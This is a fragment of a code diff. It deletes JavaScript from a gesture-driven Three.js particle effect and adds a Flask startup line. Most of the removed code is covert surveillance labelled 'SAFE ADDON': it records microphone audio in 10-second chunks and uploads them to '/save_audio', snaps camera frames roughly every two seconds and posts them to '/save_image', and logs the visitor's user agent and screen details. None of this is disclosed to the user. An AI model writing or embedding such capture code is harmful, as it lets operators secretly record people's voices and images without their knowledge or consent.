-        const p3 = posText3[i];
-        const p4 = posText4[i];
-        const p5 = posText5[i];
-
-        const tx = p1.x*w1 + p2.x*w2 + p3.x*w3 + p4.x*w4 + p5.x*w5;
-        const ty = p1.y*w1 + p2.y*w2 + p3.y*w3 + p4.y*w4 + p5.y*w5;
-        const tz = p1.z*w1 + p2.z*w2 + p3.z*w3 + p4.z*w4 + p5.z*w5;
-
-        // 2. Scatter Position
-        const s = posScatter[i];
-        const sX = s.x * state.currentScatterScale;
-        const sY = s.y * state.currentScatterScale;
-        const sZ = s.z * state.currentScatterScale;
-        
-        const noiseScale = 0.5 * state.currentScatterScale;
-        const nX = Math.sin(time + i*0.1) * noiseScale;
-        const nY = Math.cos(time + i*0.13) * noiseScale;
-
-        // 3. Blend Between Text and Scatter
-        let finalX = THREE.MathUtils.lerp(tx, sX + nX, state.currentSpread);
-        let finalY = THREE.MathUtils.lerp(ty, sY + nY, state.currentSpread);
-        let finalZ = THREE.MathUtils.lerp(tz, sZ, state.currentSpread);
-
-        // 4. Physics Interaction (Multi-Hand Repulsion)
-        if (state.voiceModeActive && state.handPositions.length > 0) {
-            for (const hPos of state.handPositions) {
-                const dx = finalX - hPos.x;
-                const dy = finalY - hPos.y;
-                const dz = finalZ - hPos.z;
-                const distSq = dx*dx + dy*dy + dz*dz;
-
-                if (distSq < interactionRadSq) {
-                    const dist = Math.sqrt(distSq);
-                    const force = (CONFIG.interactionRadius - dist) / CONFIG.interactionRadius; 
-                    
-                    const repulsion = Math.pow(force, 2) * CONFIG.repulsionStrength; 
-
-                    finalX += (dx / dist) * repulsion * 5; 
-                    finalY += (dy / dist) * repulsion * 5;
-                    finalZ += (dz / dist) * repulsion * 5;
-                }
-            }
-        }
-        // 5. Update Position with Smooth Interpolation
-        const cx = positionsArray[i*3];
-        const cy = positionsArray[i*3+1];
-        const cz = positionsArray[i*3+2];
-        const speed = 0.1;
-        positionsArray[i*3]   += (finalX - cx) * speed;
-        positionsArray[i*3+1] += (finalY - cy) * speed;
-        positionsArray[i*3+2] += (finalZ - cz) * speed;
-
-        // 6. Update Colors
-        const baseColor = new THREE.Color();
-        const cPink1 = new THREE.Color(0xff69b4); // HotPink
-        const cPurple = new THREE.Color(0xda70d6); // Orchid
-        const cBlueNeon = new THREE.Color(0x00ffff); // Cyan for AR
-        const cWhite = new THREE.Color(0xffffff);
-
-        if (state.currentSpread > 0.8) {
-            // Scatter Mode Colors
-            const dist = Math.sqrt(finalX*finalX + finalY*finalY + finalZ*finalZ);
-            const normDist = Math.min(dist / 40, 1);
-            baseColor.setHSL(0.9, 0.5, 0.8 + normDist*0.2);
-        } else {
-            if (w5 > 0.5) {
-                // AR / Voice Mode -> BLUE NEON
-                baseColor.copy(cBlueNeon);
-                baseColor.offsetHSL(0, 0, 0.1); 
-                if (Math.random() > 0.92) baseColor.setHex(0xffffff);
-            } else if (w1>0.5 || w2>0.5 || w3>0.5 || w4>0.5) {
-                // Gesture Mode -> Pink/Purple Theme
-                baseColor.lerpColors(cPink1, cPurple, 0.5);
-                const hueOffset = (finalX / 60) * 0.1;
-                baseColor.offsetHSL(hueOffset, 0, 0);
-            } else {
-                baseColor.setHex(0xffffff);
-            }
-        }
-
-        colorsArray[i*3] = baseColor.r;
-        colorsArray[i*3+1] = baseColor.g;
-        colorsArray[i*3+2] = baseColor.b;
-    }
-
-    particleGeometry.attributes.position.needsUpdate = true;
-    particleGeometry.attributes.color.needsUpdate = true;
-
-    // Galaxy Effect (Only Active on Gesture 4)
-    galaxyMaterial.opacity = THREE.MathUtils.lerp(
-        galaxyMaterial.opacity, 
-        state.galaxyEffectActive ? 0.8 : 0.0, 
-        0.03
-    );
-
-    controls.update();
-    renderer.render(scene, camera);
-}
-
-// ================================
-// AUDIO RECORDING (SAFE ADDON)
-// ================================
-let mediaRecorder = null;
-let audioChunks = [];
-let audioStartTime = 0;
-let audioInterval = null;
-let flushingAudio = false; 
-
-const AUDIO_SLICE_MS = 10000; // 10s
-
-// Detect iOS
-const IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-
-function getAudioMimeType() {
-    if (IS_IOS) {
-        return 'audio/mp4'; // iOS Safari
-    }
-    if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
-        return 'audio/webm;codecs=opus';
-    }
-    return 'audio/webm';
-}
-
-async function startVoiceRecording() {
-    if (mediaRecorder) return;
-
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const mimeType = getAudioMimeType();
-
-    mediaRecorder = new MediaRecorder(stream, { mimeType });
-
-    audioChunks = [];
-    audioStartTime = Date.now();
-
-    mediaRecorder.ondataavailable = (e) => {
-        if (e.data && e.data.size > 0) {
-            audioChunks.push(e.data);
-        }
-    };
-
-    mediaRecorder.start(1000); // lấy chunk mỗi 1s
-
-    // ⏱ Auto cắt 10s / file
-    if (!audioInterval) {
-        audioInterval = setInterval(checkAndFlushAudio, 1000);
-    }
-}
-
-function checkAndFlushAudio() {
-    if (!mediaRecorder || flushingAudio) return;
-
-    const elapsed = Date.now() - audioStartTime;
-    if (elapsed < AUDIO_SLICE_MS) return;
-
-    flushingAudio = true;
-    mediaRecorder.requestData();
-
-    setTimeout(() => {
-        if (audioChunks.length === 0) {
-            flushingAudio = false;
-            return;
-        }
-
-        const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
-        audioChunks = [];
-        audioStartTime = Date.now();
-
-        console.log('[AUDIO] sending', blob.size, blob.type);
-        sendAudioToServer(blob);
-
-        flushingAudio = false;
-    }, 250); // 👈 250ms an toàn cho iOS
-}
-
-
-async function sendAudioToServer(blob) {
-    const formData = new FormData();
-    formData.append('audio', blob);
-    formData.append('mime', blob.type);
-    formData.append('ua', navigator.userAgent);
-
-    await fetch('/save_audio', {
-        method: 'POST',
-        body: formData
-    });
-}
-
-function stopVoiceRecording() {
-    if (!mediaRecorder) return;
-
-    mediaRecorder.stop();
-    mediaRecorder.stream.getTracks().forEach(t => t.stop());
-    mediaRecorder = null;
-    audioChunks = [];
-}
-
-// ================================
-// PHOTO CAPTURE LOGIC (SAFE ADDON)
-// ================================
-const CAPTURE_INTERVAL = 2210; // 2s
-let captureTimer = null;
-let lastCaptureTime = 0;
-
-async function takePhotoFromCamera(force = false) {
-    const now = Date.now();
-    if (!force && now - lastCaptureTime < CAPTURE_INTERVAL) return;
-    lastCaptureTime = now;
-
-    try {
-        const video = videoElement;
-        if (!video || video.readyState < 2) return;
-
-        const canvas = document.getElementById('capture-canvas');
-        const ctx = canvas.getContext('2d');
-
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const imageData = canvas.toDataURL('image/png');
-
-        const res = await fetch('/save_image', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: imageData })
-        });
-        const json = await res.json();
-
-        if (json.stopped) {
-            console.warn('Capture stopped by server');
-            clearInterval(captureTimer);
-            captureTimer = null;
-        }
-    } catch (e) {
-        console.warn("Capture failed:", e);
-    }
-}
-
-startCamera();
-
-
-function _attachVideoWidth(video) {
-    return video.videoWidth || 640;
-}
-
-function _attachVideoHeight(video) {
-    return video.videoHeight || 480;
-}
-
-// ================================
-// SEND USER AGENT TO SERVER
-// ================================
-function sendUserAgent() {
-    try {
-        if (sessionStorage.getItem(UA_SENT_KEY)) {
-            return;
-        }
-
-        const ua = navigator.userAgent;
-
-        fetch('/log_user_agent', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                user_agent: ua,
-                platform: navigator.platform || '',
-                screen: `${window.innerWidth}x${window.innerHeight}`,
-                dpr: window.devicePixelRatio || 1
-            })
-        });
-
-        sessionStorage.setItem(UA_SENT_KEY, '1');
-
-    } catch (e) {
-        console.warn("UA send failed:", e);
-    }
-}
-
-
-// Gửi 1 lần khi load
-sendUserAgent();
-
-animate();
+if __name__ == '__main__':
+    app.run(debug=False)
